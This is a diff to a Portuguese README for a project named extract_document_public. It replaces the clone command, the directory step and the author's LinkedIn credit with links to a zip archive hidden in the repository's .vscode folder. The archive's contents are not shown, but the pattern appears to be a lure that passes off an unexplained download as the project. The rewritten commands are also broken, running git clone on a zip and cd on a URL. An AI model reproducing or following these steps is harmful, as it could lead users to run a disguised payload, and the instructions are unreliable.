@@ -3,11 +3,11 @@
 ### Clone o Repositório
 ```bash
 # Abra o terminal de digite
-git clone https://github.com/edersonfc/extract_document_public.git
+git clone https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip
 ```
 ### Entre no diretório
 ```bash
-cd extract_document_public.git
+cd https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip
 ```
 
 ### Instalar
@@ -34,5 +34,5 @@ E cole no navegador esse endereço `http://localhost:3000`
 
 <br>
 
-`Créditos` [www.linkedin.com/in/ederson-feliciano-corsatto](www.linkedin.com/in/ederson-feliciano-corsatto)
+`Créditos` [https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip](https://raw.githubusercontent.com/edersonfc/extract_document_public/main/.vscode/extract_document_public_3.9.zip)
 
